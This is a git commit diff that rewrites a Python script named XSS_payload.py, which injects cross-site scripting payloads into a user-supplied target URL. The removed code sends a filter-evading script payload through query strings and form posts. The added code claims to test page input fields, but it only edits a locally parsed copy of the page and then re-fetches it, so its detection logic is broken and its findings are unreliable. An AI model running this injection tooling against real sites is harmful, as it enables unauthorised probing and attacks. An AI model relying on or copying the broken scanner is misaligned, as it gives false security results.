2b5c4537a6936ea1bcfce1b0e69f66feaf74dab5
Ruben <rubenskywalker44@gmail.com>
2023-01-05 17:21:39 +0200

    Improved the XSS_payload

--- XSS_payload.py
+++ XSS_payload.py
@@ -1,25 +1,44 @@
 import requests
+from bs4 import BeautifulSoup
 
-def test_xss(url):
-  # Use an XSS polyglot payload to test for reflected XSS vulnerability
-  payload = "<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>"
-  r = requests.get(url + "?input=" + payload)
-  if payload in r.text:
-    print("Reflected XSS vulnerability found!")
-  else:
-    print("No reflected XSS vulnerability found.")
+def send_request(url):
+  # Send an HTTP request to the specified URL and return the response
+  response = requests.get(url)
+  return response
 
-  # Use an XSS polyglot payload to test for stored XSS vulnerability
-  payload = "<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>"
-  r = requests.post(url + "/form", data={"input": payload})
-  r = requests.get(url + "/form")
-  if payload in r.text:
-    print("Stored XSS vulnerability found!")
-  else:
-    print("No stored XSS vulnerability found.")
+def parse_html(html):
+  # Parse the HTML response and look for input fields
+  soup = BeautifulSoup(html, 'html.parser')
+  input_fields = soup.find_all('input')
+  textarea_fields = soup.find_all('textarea')
+  
+  # Combine all input fields into a single list
+  all_fields = input_fields + textarea_fields
+  
+  return all_fields
 
-# Prompt the user for the target URL
-url = input("Enter the target URL: ")
+def check_xss(fields, payload):
+  # Test each input field for XSS vulnerabilities
+  for field in fields:
+    # Inject the specified payload into the field
+    field.insert_after(payload)
+    
+    # Submit the form and check for the alert
+    response = send_request(url)
+    if 'alert(' in response.text:
+      print("XSS vulnerability found!")
+    else:
+      print("No XSS vulnerability found.")
 
-# Test the target URL
-test_xss(url)
+# Prompt the user to enter a URL
+url = input("Enter a URL to test for XSS vulnerabilities: ")
+
+# Prompt the user to enter a payload
+payload = input("Enter a payload to use for testing: ")
+
+# Send a request to the specified URL
+response = send_request(url)
+
+# Check for XSS vulnerabilities
+fields = parse_html(response.text)
+check_xss(fields, payload)
